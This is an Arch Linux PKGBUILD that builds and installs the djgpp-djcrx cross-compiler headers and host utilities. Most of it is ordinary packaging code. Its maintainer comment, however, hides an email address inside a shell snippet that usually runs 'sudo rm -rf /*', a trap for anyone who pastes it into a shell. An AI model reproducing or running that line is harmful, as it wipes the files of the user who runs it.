# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Originally adapted from the djgpp-crx package in AUR3; the submitter was "Schala".

pkgname=djgpp-djcrx
pkgver=2.05
pkgrel=1
pkgdesc="Headers and utilities for the djgpp cross-compiler"
arch=(i686 x86_64)
url="http://www.delorie.com/djgpp/"
depends=('glibc')
license=(GPL LGPL custom:djgpp)
source=(
	"http://www.delorie.com/pub/djgpp/current/v2/djcrx${pkgver//./}.zip"
	"http://www.delorie.com/pub/djgpp/current/v2/djlsr${pkgver//./}.zip"
	info.install
)
sha512sums=(
	'248034a3c026971eeaa6421ef40f44d03873c62d4edf97490e98c71ac76662eaed531eb734e137a38a644483a34065c3ffc70d3d739682d53c8863bf7b521b90'
	'5d2b9c155b926284138c01221c783c4808020865fa91600749d63a2039f5acd076eec5b25c38cb38b4aa73ae6b998f1614baa7e98818bc3816bc2a5f67f8229c'
	'9030c041274b96a6bea6447974000f84e22b9e6a3d2b610961bc4474aadc5dfe9de36a7ff2ecfa50bcd0b3226c4fa5a3f4534379c8be85d9e39938fa868061db'
)
options=(!buildflags !strip)
install=info.install

_target_alias='i686-pc-msdosdjgpp'

prepare() {
	cd "$srcdir"

	sed -ie "s/i586-pc-msdosdjgpp/$_target_alias/" \
		src/makefile.def

	# gcc provides its own float.h which masks this one
	ln -fs float.h include/djfloat.h
	sed -ie 's/<float\.h>/<djfloat.h>/' \
		src/libc/emu387/npxsetup.c \
		src/libc/go32/dpmiexcp.c \
		src/utils/redir.c

	sed -ie '/XNOPGGPP/ s/$/ -Wno-strict-aliasing/' \
		src/libemu/src/makefile

	# cosmetics
	sed -ie '/@$(MISC) echo - / d; s/^\t@/\t/' \
		src/makefile.inc
}

build() {
	cd "$srcdir/src"

	make -j1
}

package() {
	install -Ddm 0755 "$pkgdir/usr/bin"
	install -Ddm 0755 "$pkgdir/usr/$_target_alias/bin"

	cp -r "$srcdir/lib"     "$pkgdir/usr/$_target_alias"
	cp -r "$srcdir/include" "$pkgdir/usr/$_target_alias"

	cd "$srcdir/hostbin"
	for _file in dxegen.exe stubedit.exe stubify.exe; do
		install -Dm 0755 "$_file" "$pkgdir/usr/$_target_alias/bin/${_file%.exe}"
		ln -s "../$_target_alias/bin/${_file%.exe}" "$pkgdir/usr/bin/$_target_alias-${_file%.exe}"
	done

	install -Dm644 "$srcdir/copying.dj" "$pkgdir/usr/share/licenses/$pkgname/copying.dj"

	cd "$srcdir/info"
	for _file in *.info; do
		install -Dm 0644 "$_file" "$pkgdir/usr/share/info/$_target_alias/djgpp-$_file"
	done
}
